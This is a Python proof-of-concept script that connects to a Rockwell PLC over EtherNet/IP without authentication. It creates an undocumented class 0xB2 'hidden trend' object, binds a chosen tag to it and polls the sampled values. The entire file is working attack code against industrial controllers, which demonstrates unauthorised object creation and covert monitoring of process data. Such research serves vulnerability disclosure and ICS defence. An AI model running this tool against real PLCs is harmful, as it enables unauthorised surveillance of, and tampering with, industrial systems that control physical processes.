#!/usr/bin/env python3
"""
POC: Hidden Trend Object — Create and read CIP class 0xB2 trends.

Creates an internal trend on a Rockwell PLC to sample a tag value
via a plain EtherNet/IP connection (no auth required).

Protocol (from Studio 5000 pcap analysis — class 0xB2):
  1. EtherNet/IP session + Forward Open (plain, no privilege needed)
  2. Create trend instance (service 0x08, class 0xB2, instance 0)
  3. SetAttributeList: sample_rate_us (attr 1), state=0 (attr 5)
  4. AddTag (service 0x4E): bind tag by ANSI symbolic path
  5. Start (service 0x06): begin sampling
  6. ReadData (service 0x4C): poll for buffered samples
  7. Stop (0x07) → RemoveTag (0x4F) → Delete (0x09) on cleanup
"""

import argparse
import random
import socket
import struct
import sys
import time

# =============================================================================
# EtherNet/IP Constants
# =============================================================================

ENIP_PORT = 44818
ENIP_REGISTER_SESSION = 0x0065
ENIP_UNREGISTER_SESSION = 0x0066
ENIP_SEND_RR_DATA = 0x006F
ENIP_SEND_UNIT_DATA = 0x0070

# =============================================================================
# Configuration defaults
# =============================================================================

TARGET_IP     = ""  # PLC IP address (required)
SLOT          = 0
TAG_NAME      = ""  # Tag to trend (required)
SAMPLE_RATE   = 10000        # microseconds (10000 = 10ms)
BUFFER_SIZE   = 0x1000       # allocation size (4096, matches Studio)
NUM_TAGS      = 1            # tags per trend instance
POLL_INTERVAL = 0.3          # seconds between reads (Studio uses ~310ms)

# CIP class for trend objects (confirmed via pcap — NOT 0xA2)
TREND_CLASS = 0xB2

# =============================================================================
# CIP helpers
# =============================================================================

def build_cip_path(cip_class, instance=None):
    """Build EPATH bytes for class[/instance]."""
    path = b''
    if cip_class <= 0xFF:
        path += bytes([0x20, cip_class])
    else:
        path += struct.pack('<BBH', 0x21, 0x00, cip_class)
    if instance is not None:
        if instance <= 0xFF:
            path += bytes([0x24, instance])
        else:
            path += struct.pack('<BBH', 0x25, 0x00, instance)
    return path


def build_symbolic_segment(tag_name):
    """Build ANSI Extended Symbol segment for symbolic tag access."""
    parts = tag_name.split('.')
    seg = b''
    for part in parts:
        encoded = part.encode('ascii')
        seg += bytes([0x91, len(encoded)]) + encoded
        if len(encoded) % 2:
            seg += b'\x00'
    return seg


def parse_cip_status(resp):
    """Parse CIP response header. Returns (status, ext_status, data)."""
    if len(resp) < 4:
        return 0xFF, 0, b''
    status = resp[2]
    ext_size = resp[3]
    ext_status = 0
    data_offset = 4
    if ext_size > 0 and 4 + ext_size * 2 <= len(resp):
        ext_status = struct.unpack_from('<H', resp, 4)[0]
        data_offset = 4 + ext_size * 2
    return status, ext_status, resp[data_offset:]


def hexdump(data, prefix="  "):
    """Print hex dump of data."""
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02X}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"{prefix}{i:04X}: {hex_part:<48s} {ascii_part}")


# =============================================================================
# Standard EtherNet/IP Connected Transport (no auth)
# =============================================================================

class StandardConnection:
    """Plain EtherNet/IP session + CIP Forward Open connected transport."""

    def __init__(self, target_ip, slot=0, timeout=10.0):
        self.target_ip = target_ip
        self.slot = slot
        self.timeout = timeout
        self.sock = None
        self.session = 0
        self.ot_connection_id = 0
        self.to_connection_id = 0
        self.conn_serial = 0
        self.sequence = 0

    # ── EtherNet/IP primitives ────────────────────────────────────────────

    def _enip_header(self, command, session=0, data=b''):
        return struct.pack('<HHIIQI', command, len(data), session, 0, 0, 0) + data

    def _recv_exact(self, count):
        buf = b''
        while len(buf) < count:
            chunk = self.sock.recv(count - len(buf))
            if not chunk:
                raise ConnectionError("Connection closed")
            buf += chunk
        return buf

    def _recv_enip(self):
        header = self._recv_exact(24)
        _, length = struct.unpack_from('<HH', header, 0)
        payload = self._recv_exact(length) if length > 0 else b''
        return header + payload

    def _parse_enip(self, data):
        if len(data) < 24:
            raise ValueError(f"ENIP response too short: {len(data)} bytes")
        command, length, session, status = struct.unpack_from('<HHII', data, 0)
        return command, session, status, data[24:24+length]

    def _parse_send_rr_response(self, payload):
        if len(payload) < 6:
            raise ValueError(f"SendRRData payload too short: {len(payload)} bytes")
        iface, timeout, count = struct.unpack_from('<IHH', payload, 0)
        offset = 8
        for _ in range(count):
            type_id, length = struct.unpack_from('<HH', payload, offset)
            offset += 4
            if type_id == 0xB2:  # Unconnected Data Item
                return payload[offset:offset+length]
            offset += length
        raise ValueError("No Unconnected Data Item (0xB2) in response")

    def _parse_send_unit_response(self, payload):
        if len(payload) < 6:
            raise ValueError(f"SendUnitData payload too short")
        iface, timeout, count = struct.unpack_from('<IHH', payload, 0)
        offset = 8
        conn_id = 0
        seq = 0
        cip_data = b''
        for _ in range(count):
            type_id, length = struct.unpack_from('<HH', payload, offset)
            offset += 4
            if type_id == 0xA1:  # Connected Address Item
                conn_id = struct.unpack_from('<I', payload, offset)[0]
            elif type_id == 0xB1:  # Connected Data Item
                seq = struct.unpack_from('<H', payload, offset)[0]
                cip_data = payload[offset+2:offset+length]
            offset += length
        return conn_id, seq, cip_data

    # ── Session & Transport ───────────────────────────────────────────────

    def connect(self):
        """Register EtherNet/IP session + Forward Open."""
        print(f"Connecting to {self.target_ip}:{ENIP_PORT}...")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.target_ip, ENIP_PORT))

        # Register Session
        data = struct.pack('<HH', 1, 0)
        packet = self._enip_header(ENIP_REGISTER_SESSION, 0, data)
        print(f"\n[SEND] ({len(packet)} bytes):")
        hexdump(packet)
        self.sock.sendall(packet)
        resp = self._recv_enip()
        print(f"\n[RECV] ({len(resp)} bytes):")
        hexdump(resp)
        _, self.session, status, _ = self._parse_enip(resp)
        if status != 0:
            raise RuntimeError(f"RegisterSession failed: status=0x{status:08X}")
        print(f"  Session: 0x{self.session:08X}")

        # Forward Open
        self._forward_open()

    def _forward_open(self):
        """CIP Forward Open — establish class 3 connected transport."""
        ot_id = 0x80000000 | random.randint(1, 0xFFFF)
        to_id = 0x803F0000 | random.randint(1, 0xFFFF)
        self.conn_serial = random.randint(1, 0xFFFF)

        # Connection path: backplane port 1 → slot
        conn_path = bytes([0x01, self.slot, 0x20, 0x02, 0x24, 0x01])
        conn_path_words = len(conn_path) // 2

        fo = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])  # Forward Open, class 6, inst 1
        fo += struct.pack('<BB', 0x0A, 0x0E)               # priority/tick, timeout ticks
        fo += struct.pack('<I', ot_id)                      # O->T connection ID
        fo += struct.pack('<I', to_id)                      # T->O connection ID
        fo += struct.pack('<H', self.conn_serial)           # connection serial
        fo += struct.pack('<H', 0x1234)                     # vendor ID (arbitrary)
        fo += struct.pack('<I', 0x00000001)                 # originator serial
        fo += struct.pack('<B', 0x03)                       # connection timeout multiplier
        fo += b'\x00\x00\x00'                               # reserved
        fo += struct.pack('<I', 0x00201340)                 # O->T RPI (2s)
        fo += struct.pack('<H', 0x43F4)                     # O->T params (500 bytes, class 3)
        fo += struct.pack('<I', 0x00201340)                 # T->O RPI (2s)
        fo += struct.pack('<H', 0x43F4)                     # T->O params (500 bytes, class 3)
        fo += struct.pack('<B', 0xA3)                       # transport trigger (class 3, server)
        fo += struct.pack('<B', conn_path_words)
        fo += conn_path

        # Send in SendRRData (not wrapped in Unconnected Send)
        payload = struct.pack('<IHH', 0, 0, 2)  # interface=0, timeout=0, count=2
        payload += struct.pack('<HH', 0x00, 0)   # Null Address Item
        payload += struct.pack('<HH', 0xB2, len(fo)) + fo  # Unconnected Data Item
        packet = self._enip_header(ENIP_SEND_RR_DATA, self.session, payload)
        print(f"\n[SEND] ({len(packet)} bytes):")
        hexdump(packet)
        self.sock.sendall(packet)

        resp = self._recv_enip()
        print(f"\n[RECV] ({len(resp)} bytes):")
        hexdump(resp)
        _, _, status, resp_payload = self._parse_enip(resp)
        if status != 0:
            raise RuntimeError(f"Forward Open SendRRData failed: 0x{status:08X}")

        cip_resp = self._parse_send_rr_response(resp_payload)
        if len(cip_resp) < 4 or cip_resp[2] != 0:
            cip_status = cip_resp[2] if len(cip_resp) > 2 else 0xFF
            raise RuntimeError(f"Forward Open CIP failed: 0x{cip_status:02X}")

        # Parse Forward Open response: O->T at +4, T->O at +8
        self.ot_connection_id = struct.unpack_from('<I', cip_resp, 4)[0]
        self.to_connection_id = struct.unpack_from('<I', cip_resp, 8)[0]
        print(f"  Forward Open OK: O->T=0x{self.ot_connection_id:08X}, T->O=0x{self.to_connection_id:08X}")
        time.sleep(0.25)

    def send_cip(self, cip_message):
        """Send CIP on connected transport, return response data."""
        self.sequence += 1
        cip_with_seq = struct.pack('<H', self.sequence) + cip_message
        payload = struct.pack('<IHH', 0, 0, 2)
        payload += struct.pack('<HHI', 0xA1, 4, self.ot_connection_id)
        payload += struct.pack('<HH', 0xB1, len(cip_with_seq)) + cip_with_seq
        packet = self._enip_header(ENIP_SEND_UNIT_DATA, self.session, payload)
        print(f"\n[SEND] ({len(packet)} bytes):")
        hexdump(packet)
        self.sock.sendall(packet)
        resp = self._recv_enip()
        print(f"\n[RECV] ({len(resp)} bytes):")
        hexdump(resp)
        _, _, status, resp_payload = self._parse_enip(resp)
        if status != 0:
            raise RuntimeError(f"SendUnitData failed: 0x{status:08X}")
        _, _, cip_data = self._parse_send_unit_response(resp_payload)
        return cip_data

    def close(self):
        """Forward Close → UnregisterSession → close socket."""
        if not self.sock:
            return
        if self.ot_connection_id:
            try:
                conn_path = bytes([0x01, self.slot, 0x20, 0x02, 0x24, 0x01])
                fc = bytes([0x4E, 0x02, 0x20, 0x06, 0x24, 0x01])
                fc += struct.pack('<BB', 0x0A, 0x0E)
                fc += struct.pack('<H', self.conn_serial)
                fc += struct.pack('<H', 0x1234)
                fc += struct.pack('<I', 0x00000001)
                fc += struct.pack('<B', len(conn_path) // 2)
                fc += b'\x00'
                fc += conn_path
                payload = struct.pack('<IHH', 0, 0, 2)
                payload += struct.pack('<HH', 0x00, 0)
                payload += struct.pack('<HH', 0xB2, len(fc)) + fc
                self.sock.sendall(self._enip_header(ENIP_SEND_RR_DATA, self.session, payload))
                resp = self._recv_enip()
                _, _, status, _ = self._parse_enip(resp)
                print(f"  Forward Close: status 0x{status:02X}")
            except Exception as e:
                print(f"  Forward Close failed: {e}")
            self.ot_connection_id = 0
        try:
            self.sock.sendall(self._enip_header(ENIP_UNREGISTER_SESSION, self.session))
        except Exception:
            pass
        self.sock.close()
        self.sock = None
        print("Connection closed.")


# =============================================================================
# Trend operations (class 0xB2)
# =============================================================================

class TrendPOC:
    def __init__(self, target, slot=0):
        self.conn = StandardConnection(target, slot=slot)
        self.target = target
        self.slot = slot
        self.trend_inst = None  # assigned by PLC on create

    def connect(self):
        """Establish EtherNet/IP session + Forward Open (no auth needed)."""
        self.conn.connect()
        return True

    def close(self):
        self.conn.close()

    def _send(self, msg):
        """Send CIP on connected transport, return raw response."""
        return self.conn.send_cip(msg)

    # ── Diagnostics ──────────────────────────────────────────────────────

    def read_tag_value(self, tag_name, elements=1):
        """Read tag via symbolic addressing (CIP Read Tag, service 0x4C)."""
        seg = build_symbolic_segment(tag_name)
        path_words = len(seg) // 2
        data = struct.pack('<H', elements)
        msg = bytes([0x4C, path_words]) + seg + data
        print(f"\n[READ TAG] {tag_name}")

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)

        if status == 0x00 and len(payload) >= 4:
            data_type = struct.unpack_from('<H', payload, 0)[0]
            raw_value = payload[2:]
            type_name = {0xC1:'BOOL', 0xC2:'SINT', 0xC3:'INT', 0xC4:'DINT', 0xCA:'REAL'}.get(data_type, f'0x{data_type:04X}')
            if data_type == 0xC4 and len(raw_value) >= 4:
                val = struct.unpack_from('<i', raw_value)[0]
                print(f"  {type_name} = {val}")
            elif data_type == 0xCA and len(raw_value) >= 4:
                val = struct.unpack_from('<f', raw_value)[0]
                print(f"  {type_name} = {val}")
            else:
                print(f"  {type_name} = {raw_value.hex()}")
            return data_type, raw_value
        else:
            print(f"  FAILED: status=0x{status:02X} ext=0x{ext:04X}")
            return None, None

    # ── Trend lifecycle ──────────────────────────────────────────────────

    def create_trend(self, buffer_size=0x1000, num_tags=1):
        """Create trend instance (service 0x08, class 0xB2, instance 0).

        PLC assigns the instance ID. Returns (status, instance_id).
        Request format from pcap: [02 00][08 00][bufsize:4LE][03 00][num_tags:1]
        """
        print(f"\n[CREATE TREND] bufsize=0x{buffer_size:X}, num_tags={num_tags}")
        path = build_cip_path(TREND_CLASS, 0)  # instance 0 = class-level create
        path_words = len(path) // 2
        # 2 attrs: attr 8 = buffer size (uint32), attr 3 = num_tags (uint8)
        data = struct.pack('<HH', 2, 8) + struct.pack('<I', buffer_size)
        data += struct.pack('<H', 3) + struct.pack('<B', num_tags)
        msg = bytes([0x08, path_words]) + path + data
        print(f"  Request: {msg.hex()}")

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")

        if status == 0x00 and len(payload) >= 4:
            inst_id = struct.unpack_from('<I', payload, 0)[0]
            self.trend_inst = inst_id
            print(f"  SUCCESS — instance {inst_id} allocated")
            if len(payload) >= 8:
                addr = struct.unpack_from('<I', payload, 4)[0]
                print(f"  Internal addr: 0x{addr:08X}")
            return status, inst_id
        else:
            print(f"  FAILED")
            if payload:
                hexdump(payload)
            return status, None

    def set_trend_attrs(self, instance_id, sample_rate_us=None, state=None):
        """SetAttributeList (service 0x04) on trend instance.

        attr 1 = sample_rate in microseconds (uint32)
        attr 5 = state (uint8, 0=stopped)
        """
        print(f"\n[SET ATTRS] Instance {instance_id}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2

        attrs = []
        if sample_rate_us is not None:
            attrs.append((1, struct.pack('<I', sample_rate_us)))
            print(f"  attr 1 = {sample_rate_us} us ({sample_rate_us/1000:.1f} ms)")
        if state is not None:
            attrs.append((5, struct.pack('<B', state)))
            print(f"  attr 5 = {state} (state)")

        if not attrs:
            return 0xFF

        data = struct.pack('<H', len(attrs))
        for attr_id, attr_val in attrs:
            data += struct.pack('<H', attr_id) + attr_val

        msg = bytes([0x04, path_words]) + path + data
        print(f"  Request: {msg.hex()}")

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status != 0x00 and payload:
            hexdump(payload)
        return status

    def get_trend_attrs(self, instance_id):
        """GetAttributeList (service 0x03) — attrs [1,3,5,6,7,8,0x0A]."""
        print(f"\n[GET ATTRS] Instance {instance_id}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2

        attr_ids = [1, 3, 5, 6, 7, 8, 0x0A]
        data = struct.pack('<H', len(attr_ids))
        for a in attr_ids:
            data += struct.pack('<H', a)

        msg = bytes([0x03, path_words]) + path + data

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status == 0x00 and payload:
            print(f"  Response ({len(payload)} bytes):")
            hexdump(payload)
        return status

    def add_tag(self, instance_id, tag_name):
        """AddTag (service 0x4E) — bind a tag by ANSI symbolic path.

        Request: [01 00][01][01][symbolic_path][FF FF FF FF]
        """
        print(f"\n[ADD TAG] Instance {instance_id}, tag='{tag_name}'")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2

        sym_path = build_symbolic_segment(tag_name)
        sym_path_words = len(sym_path) // 2
        # [num_tags:u16=1][tag_index:u8=1][type:u8=1][path_size_words:u8][path][mask:u32=0xFFFFFFFF]
        data = struct.pack('<H', 1)  # 1 tag
        data += struct.pack('<BBB', 1, 1, sym_path_words)  # tag_index=1, type=1, path_size
        data += sym_path
        data += struct.pack('<I', 0xFFFFFFFF)  # mask = all bits

        msg = bytes([0x4E, path_words]) + path + data
        print(f"  Request: {msg.hex()}")

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status == 0x00:
            print(f"  SUCCESS — tag bound")
        else:
            print(f"  FAILED")
            if payload:
                hexdump(payload)
        return status

    def start_trend(self, instance_id):
        """Start sampling (service 0x06 = Apply Attributes)."""
        print(f"\n[START] Instance {instance_id}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2
        msg = bytes([0x06, path_words]) + path

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status == 0x00:
            print(f"  SUCCESS — trend started")
            if len(payload) >= 8:
                ts1 = struct.unpack_from('<I', payload, 0)[0]
                ts2 = struct.unpack_from('<I', payload, 4)[0]
                print(f"  Timestamp: 0x{ts1:08X} 0x{ts2:08X}")
        else:
            if payload:
                hexdump(payload)
        return status

    def stop_trend(self, instance_id):
        """Stop sampling (service 0x07 = Reset)."""
        print(f"\n[STOP] Instance {instance_id}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2
        msg = bytes([0x07, path_words]) + path

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status == 0x00:
            print(f"  Trend stopped")
        return status

    def remove_tag(self, instance_id, tag_index=1):
        """Remove tag from trend (service 0x4F)."""
        print(f"\n[REMOVE TAG] Instance {instance_id}, index={tag_index}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2
        data = struct.pack('<H', tag_index)
        msg = bytes([0x4F, path_words]) + path + data

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        return status

    def delete_trend(self, instance_id):
        """Delete trend instance (service 0x09)."""
        print(f"\n[DELETE] Instance {instance_id}")
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2
        msg = bytes([0x09, path_words]) + path

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)
        print(f"  Status: 0x{status:02X}, ext: 0x{ext:04X}")
        if status == 0x00:
            print(f"  Trend deleted")
        return status

    def read_trend_data(self, instance_id):
        """Read trend data (service 0x4C) — no request data per pcap.

        Returns list of (count, value, timestamp) tuples.
        Each entry is 10 bytes: [uint16 count][uint32 value][uint32 timestamp]
        """
        path = build_cip_path(TREND_CLASS, instance_id)
        path_words = len(path) // 2
        msg = bytes([0x4C, path_words]) + path  # no request data

        resp = self._send(msg)
        status, ext, payload = parse_cip_status(resp)

        samples = []
        if len(payload) >= 10:
            for i in range(0, len(payload) - 9, 10):
                cnt = struct.unpack_from('<H', payload, i)[0]
                timestamp = struct.unpack_from('<I', payload, i + 2)[0]
                value = struct.unpack_from('<I', payload, i + 6)[0]
                samples.append((cnt, value, timestamp))

        return status, samples, payload


# =============================================================================
# Main workflow
# =============================================================================

def main():
    parser = argparse.ArgumentParser(description="POC: Hidden Trend Object (class 0xB2)")
    parser.add_argument('--target', default=TARGET_IP, help=f'PLC IP (default: {TARGET_IP})')
    parser.add_argument('--slot', type=int, default=SLOT, help=f'PLC slot (default: {SLOT})')
    parser.add_argument('--tag', default=TAG_NAME, help=f'Tag to trend (default: {TAG_NAME})')
    parser.add_argument('--rate', type=int, default=SAMPLE_RATE,
                        help=f'Sample rate in microseconds (default: {SAMPLE_RATE})')
    parser.add_argument('--bufsize', type=lambda x: int(x, 0), default=BUFFER_SIZE,
                        help=f'Buffer size (default: 0x{BUFFER_SIZE:X})')
    parser.add_argument('--poll', type=float, default=POLL_INTERVAL,
                        help=f'Poll interval seconds (default: {POLL_INTERVAL})')
    parser.add_argument('--probe', action='store_true',
                        help='Only probe: read tag value, then exit')
    parser.add_argument('--delete', type=int, metavar='INST',
                        help='Delete a specific trend instance and exit')
    parser.add_argument('--debug', action='store_true',
                        help='Print raw hex dumps for debugging')
    args = parser.parse_args()

    if not args.target:
        parser.error("--target is required (PLC IP address)")
    if not args.tag and not args.delete:
        parser.error("--tag is required (tag name to trend)")

    poc = TrendPOC(args.target, slot=args.slot)

    try:
        # Step 1: Connect
        print("=" * 70)
        print(f"Connecting to {args.target} (slot {args.slot})...")
        print("=" * 70)
        poc.connect()

        # Step 2: Verify tag and determine data type
        data_type, _ = poc.read_tag_value(args.tag)
        tag_type = data_type  # store for trend display formatting

        if args.probe:
            print("\n[PROBE COMPLETE]")
            return

        if args.delete is not None:
            poc.delete_trend(args.delete)
            return

        # Step 3: Create trend instance
        print("\n" + "=" * 70)
        print("CREATING TREND")
        print("=" * 70)
        status, inst = poc.create_trend(buffer_size=args.bufsize, num_tags=1)
        if status != 0x00 or inst is None:
            print(f"\nCreate failed (0x{status:02X}). Cannot continue.")
            return

        # Step 4: Configure
        print("\n" + "=" * 70)
        print("CONFIGURING TREND")
        print("=" * 70)
        poc.set_trend_attrs(inst, sample_rate_us=args.rate, state=0)
        poc.get_trend_attrs(inst)

        # Step 5: Add tag
        poc.add_tag(inst, args.tag)

        # Step 6: Start
        poc.start_trend(inst)

        # Verify state after start
        poc.get_trend_attrs(inst)

        # Step 7: Read loop
        print("\n" + "=" * 70)
        print(f"READING TREND DATA (instance {inst}, poll every {args.poll}s)")
        print("Press Ctrl+C to stop")
        print("=" * 70)

        read_count = 0
        total_samples = 0
        while True:
            read_count += 1
            status, samples, raw = poc.read_trend_data(inst)

            ts = time.strftime('%H:%M:%S')
            if samples:
                total_samples += len(samples)
                print(f"\n[{ts}] Read #{read_count}: {len(samples)} sample(s) "
                      f"(total: {total_samples})")
                for i, (cnt, val, tstamp) in enumerate(samples[:20]):
                    if tag_type == 0xCA:  # REAL
                        val_float = struct.unpack('<f', struct.pack('<I', val))[0]
                        print(f"  [{i:3d}] value={val_float:<12.4f} "
                              f"(0x{val:08X})  time={tstamp}us")
                    else:  # DINT, INT, SINT, BOOL, or unknown
                        val_signed = struct.unpack('<i', struct.pack('<I', val))[0]
                        print(f"  [{i:3d}] value={val_signed:<10d} "
                              f"(0x{val:08X})  time={tstamp}us")
                if len(samples) > 20:
                    print(f"  ... ({len(samples) - 20} more)")
            else:
                if args.debug and raw and any(b != 0 for b in raw):
                    print(f"\n[{ts}] Read #{read_count}: raw response:")
                    hexdump(raw)
                else:
                    print(f"[{ts}] Read #{read_count}: no data (status=0x{status:02X})")

            time.sleep(args.poll)

    except KeyboardInterrupt:
        print("\n\nStopping...")
    except Exception as e:
        print(f"\nERROR: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Clean shutdown: stop → remove tag → delete → close
        if poc.trend_inst is not None:
            inst = poc.trend_inst
            print(f"\nCleaning up trend instance {inst}...")
            try:
                poc.stop_trend(inst)
            except Exception:
                pass
            try:
                poc.remove_tag(inst, 1)
            except Exception:
                pass
            try:
                poc.delete_trend(inst)
            except Exception:
                pass
        print("Closing connection...")
        poc.close()


if __name__ == '__main__':
    main()

